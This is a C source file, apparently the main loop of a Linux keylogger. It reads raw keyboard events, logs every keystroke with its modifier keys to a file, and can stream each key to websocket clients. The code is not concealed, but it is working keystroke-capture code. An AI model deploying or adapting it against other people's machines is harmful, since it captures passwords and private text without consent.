#include <fcntl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "behavior_subject.h"
#include "keylogger.h"

#ifdef USE_LIBWEBSOCKETS
#include "websocket.h"
#endif

static volatile sig_atomic_t keep_running = true;
static bool printk_active = false;

void notify_key(const char *key);
void signal_handler();

int main(int argc, const char *argv[]) {
    const char *target_device_name = NULL;
#ifdef USE_LIBWEBSOCKETS
    uint16_t port = 33300;
#endif
    for (int i = 1; i < argc; i++) {
        // Device option
        if (strcmp(argv[i], "--dev") == 0 && i + 1 < argc) {
            target_device_name = argv[i + 1];
            // Print key option
        } else if (strcmp(argv[i], "--printk") == 0) {
            printk_active = true;
            // Websocket option
        }
#ifdef USE_LIBWEBSOCKETS
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            port = (uint16_t)atoi(argv[i + 1]);
        }
#endif
    }

    char *keyboard_path = find_keyboard_device(target_device_name);
    if (!keyboard_path) {
        fprintf(stderr, "No keyboard device found");
        if (target_device_name) {
            fprintf(stderr, " with name: %s\n", target_device_name);
        } else {
            fprintf(stderr, "\n");
        }
        return EXIT_FAILURE;
    }

    char *keyboard_name = get_keyboard_name(keyboard_path);
    if (keyboard_name) {
        printf("Using keyboard device: %s\n", keyboard_name);
    } else {
        printf("Using keyboard device: %s\n", keyboard_path);
    }

    free(keyboard_name);

    FILE *fp = fopen(LOG_FILE, "w");
    if (fp == NULL) {
        printf("Cannot open log file\n");
        free(keyboard_path);
        return EXIT_FAILURE;
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        printf("Cannot open keyboard device\n");
        free(keyboard_path);
        fclose(fp);
        return EXIT_FAILURE;
    }

    bool state_capslock_active = false;
    unsigned char led_status_bytes[(LED_MAX / 8) + 1] = {0};
    if (ioctl(fd, EVIOCGLED(sizeof(led_status_bytes)), led_status_bytes) == -1) {
        printf("Failed to get CapsLock LED status\n");
    } else {
        const int byte_index = LED_CAPSL / 8;
        const int bit_shift = LED_CAPSL % 8;
        state_capslock_active = (led_status_bytes[byte_index] & (1 << bit_shift)) != 0;
    }

    struct input_event event;
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
         capslock_active = state_capslock_active;

    BehaviorSubject subject;
    init_behavior_subject(&subject, "SKIP");
    subscribe(&subject, notify_key);

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

#ifdef USE_LIBWEBSOCKETS
    printf("Websocket listening on port: %d\n", port);
    if (init_websocket_server(port) != 0) {
        free(keyboard_path);
        close(fd);
        fclose(fp);
        unsubscribe(&subject);
        return EXIT_FAILURE;
    }
#endif

    char state_key_name[MAX_KEY_LEN];
    while (keep_running) {
#ifdef USE_LIBWEBSOCKETS
        lws_service(context, 0);
#endif
        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == sizeof(event)) {
            if (event.type == EV_KEY) {
                // Update status modifier keys
                if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                    shift_pressed = event.value;
                } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = event.value;
                } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                    meta_pressed = event.value;
                } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                    alt_pressed = event.value;
                }
                // Log modifier keys independently
                if (event.value == 1) {
                    state_key_name[0] = '\0';
                    if (event.code == KEY_CAPSLOCK) {
                        state_capslock_active = !state_capslock_active;
                        capslock_active = state_capslock_active;
                        strcat(state_key_name, "CapsLock");
                        log_key(fp, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                    } else {
                        if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                            capslock_active = false;
                            strcat(state_key_name, "Shift");
                        } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                            strcat(state_key_name, "Ctrl");
                        } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                            strcat(state_key_name, "Meta");
                        } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                            strcat(state_key_name, "Alt");
                        } else if (state_capslock_active) {
                            capslock_active = state_capslock_active;
                        }
                        if (state_key_name[0] != '\0') {
                            log_key(fp, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                        }
                        // Log other keys
                        const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                        if (strcmp(key_name, "UNKNOWN") != 0) {
                            strcat(state_key_name, key_name);
                            log_key(fp, &subject, ctrl_pressed, meta_pressed, alt_pressed, state_key_name);
                        }
                    }
                    memset(state_key_name, 0, sizeof(state_key_name));
                }
            }
        } else if (bytes_read == -1) {
            break;
        }
    }

    free(keyboard_path);
    close(fd);
    fclose(fp);
    unsubscribe(&subject);
    memset(state_key_name, 0, sizeof(state_key_name));

#ifdef USE_LIBWEBSOCKETS
    destroy_websocket_server();
#endif

    return EXIT_SUCCESS;
}

void notify_key(const char *key) {
    if (strcmp(key, "SKIP") == 0) {
        return;
    }
    if (printk_active) {
        printf("%s\n", key);
    }
#ifdef USE_LIBWEBSOCKETS
    send_message_to_client(key);
#endif
}

void signal_handler() { keep_running = false; }
